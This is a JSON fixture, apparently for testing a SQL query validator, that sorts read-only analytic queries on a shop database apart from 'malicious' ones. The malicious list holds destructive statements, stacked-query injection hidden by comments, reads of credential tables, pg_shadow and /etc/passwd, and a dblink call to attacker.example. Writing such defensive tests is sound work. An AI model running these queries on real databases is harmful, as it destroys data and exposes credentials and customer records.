{
  "safe": [
    "SELECT name, country FROM customers LIMIT 20",
    "SELECT COUNT(id) AS n FROM orders LIMIT 1",
    "SELECT category, COUNT(id) AS products FROM products GROUP BY category LIMIT 20",
    "SELECT c.name, SUM(oi.quantity * oi.unit_price) AS revenue FROM customers c JOIN orders o ON o.customer_id = c.id JOIN order_items oi ON oi.order_id = o.id GROUP BY c.name ORDER BY revenue DESC LIMIT 10",
    "SELECT status, COUNT(id) AS orders FROM orders GROUP BY status LIMIT 10",
    "SELECT name FROM products WHERE active = 1 ORDER BY unit_price DESC LIMIT 15",
    "SELECT shipping_country, COUNT(id) AS n FROM orders GROUP BY shipping_country ORDER BY n DESC LIMIT 10",
    "SELECT AVG(unit_price) AS avg_price FROM products LIMIT 1",
    "SELECT MIN(order_date) AS first_order, MAX(order_date) AS last_order FROM orders LIMIT 1",
    "SELECT segment, COUNT(id) AS customers FROM customers GROUP BY segment LIMIT 10",
    "WITH totals AS (SELECT order_id, SUM(quantity * unit_price) AS total FROM order_items GROUP BY order_id) SELECT ROUND(AVG(total), 2) AS aov FROM totals LIMIT 1",
    "SELECT p.category, SUM(oi.quantity) AS units FROM products p JOIN order_items oi ON oi.product_id = p.id GROUP BY p.category ORDER BY units DESC LIMIT 10",
    "SELECT name, email FROM customers WHERE country = 'DE' LIMIT 30",
    "SELECT o.id, o.order_date FROM orders o WHERE o.status = 'pending' ORDER BY o.order_date LIMIT 50",
    "SELECT UPPER(name) AS name FROM customers LIMIT 5",
    "SELECT SUBSTR(order_date, 1, 7) AS month, COUNT(id) AS orders FROM orders GROUP BY month ORDER BY month LIMIT 24",
    "SELECT COALESCE(city, 'unknown') AS city, COUNT(id) AS n FROM customers GROUP BY city LIMIT 20",
    "SELECT ROUND(SUM((unit_price - cost)), 2) AS total_margin FROM products LIMIT 1",
    "SELECT quantity, COUNT(id) AS lines FROM order_items GROUP BY quantity LIMIT 10",
    "SELECT name FROM customers ORDER BY signup_date DESC LIMIT 10",
    "SELECT c.country, ROUND(SUM(oi.quantity * oi.unit_price), 2) AS revenue FROM customers c JOIN orders o ON o.customer_id = c.id JOIN order_items oi ON oi.order_id = o.id WHERE o.status = 'completed' GROUP BY c.country ORDER BY revenue DESC LIMIT 10",
    "SELECT COUNT(id) AS cancelled FROM orders WHERE status = 'cancelled' LIMIT 1",
    "SELECT p.name, MAX(oi.unit_price) AS max_sold_price FROM products p JOIN order_items oi ON oi.product_id = p.id GROUP BY p.name ORDER BY max_sold_price DESC LIMIT 10",
    "SELECT LENGTH(name) AS name_length, name FROM products ORDER BY name_length DESC LIMIT 5",
    "SELECT id, order_date FROM orders WHERE order_date >= '2024-01-01' LIMIT 100"
  ],
  "malicious": [
    "DELETE FROM customers",
    "DROP TABLE orders",
    "UPDATE customers SET segment = 'vip'",
    "INSERT INTO customers (id, name) VALUES (999, 'evil')",
    "TRUNCATE TABLE order_items",
    "GRANT ALL PRIVILEGES ON customers TO attacker",
    "ALTER TABLE customers ADD COLUMN backdoor TEXT",
    "CREATE TABLE exfil AS SELECT * FROM customers",
    "SELECT name FROM customers; DROP TABLE orders;",
    "SELECT name FROM customers; DELETE FROM orders WHERE 1=1;",
    "SELECT * FROM internal_credentials",
    "SELECT secret FROM internal_credentials WHERE service = 'payments-api'",
    "SELECT * FROM pg_shadow",
    "SELECT usename, passwd FROM pg_shadow",
    "SELECT * FROM information_schema.tables",
    "SELECT pg_sleep(60)",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT dblink('host=attacker.example', 'SELECT 1')",
    "SELECT name FROM customers WHERE id IN (SELECT id FROM internal_credentials)",
    "WITH leak AS (SELECT secret FROM internal_credentials) SELECT * FROM leak",
    "SELECT c.name FROM customers c JOIN internal_credentials i ON i.id = c.id",
    "SELECT name /* comment */ FROM customers ; DELETE /* hidden */ FROM orders",
    "SELECT lo_import('/etc/passwd')",
    "SELECT id INTO stolen_data FROM customers",
    "SELECT name FROM customers WHERE country = (SELECT secret FROM internal_credentials LIMIT 1)"
  ]
}
